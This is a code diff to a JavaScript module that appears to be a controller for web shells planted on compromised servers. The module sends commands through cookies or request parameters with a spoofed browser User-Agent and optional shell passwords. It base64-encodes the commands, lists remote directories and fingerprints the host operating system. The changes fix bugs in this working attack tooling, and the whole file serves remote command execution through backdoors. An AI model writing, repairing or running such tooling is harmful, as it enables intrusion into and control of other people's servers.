@@ -1,13 +1,17 @@
 const axios = require("axios");
 const COMMAND_MAP = require("./reqTypes").COMMAND_MAP;
 const { LIST_DIR } = require("./reqTypes");
+const { WINDOWS, MAC, LINUX } = require("./osTypes");
 const { parseListDirResponse } = require("./utils");
 
 const generateConfig = (shell, command) => {
 	var config = {
 		headers: {
 			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0",
-		}
+		},
+		params: {},
+		data: {},
+		timeout: 30000
 	};
 
 	switch(shell.commandParamType) {
@@ -20,10 +24,13 @@ const generateConfig = (shell, command) => {
 
 			break;
 		case "cookie":
-			config["headers"]["Cookie"] = `${shell.commandParam}=${command}`;
+			const commandCookie = `${shell.commandParam}=${command}`;
 
 			if(shell.passwordEnabled) {
-				config["headers"]["Cookie"] = `${shell.passwordParam}=${shell.password}`;
+				authCookie = `${shell.passwordParam}=${shell.password}`;
+				config["headers"]["Cookie"] = commandCookie.concat("; ", authCookie);
+			} else {
+				config["headers"]["Cookie"] = commandCookie;
 			}
 
 			break;
@@ -48,7 +55,6 @@ const generateConfig = (shell, command) => {
 			break;
 	}
 	
-	console.log(config);
 	return config;
 }
 
@@ -57,7 +63,7 @@ const encodeCommand = (command, shellEncoding) => {
 
 	switch(shellEncoding) {
 		case "base64":
-			encoded = btoa(command);
+			encoded = Buffer.from(command).toString("base64");
 			break;
 		default:
 			console.error("Unsupported command encoding!");
@@ -85,7 +91,7 @@ const sendRequest = async (shell, reqType) => {
 
 const listDir = async (shell) => {
 	const response = await sendRequest(shell, LIST_DIR);
-	const dir = parseListDirResponse(response);
+	const dir = parseListDirResponse(response.data);
 
 	return dir;
 }
@@ -105,9 +111,9 @@ const determineOS = async (shell) => {
 	var os = LINUX;
 
 	// Windows does not have `uname`
-	if(response.data.body.includes("not recognized")) {
+	if(response.data.includes("not recognized")) {
 		os = WINDOWS;
-	} else if(response.data.body.includes("Linux")) {
+	} else if(response.data.includes("Linux")) {
 		os = LINUX;
 	} else {
 		os = MAC;
@@ -116,4 +122,4 @@ const determineOS = async (shell) => {
 	return os;
 };
 
-module.exports = { sendRequest, determineOS, listDir }
+module.exports = { sendRequest, determineOS, listDir };
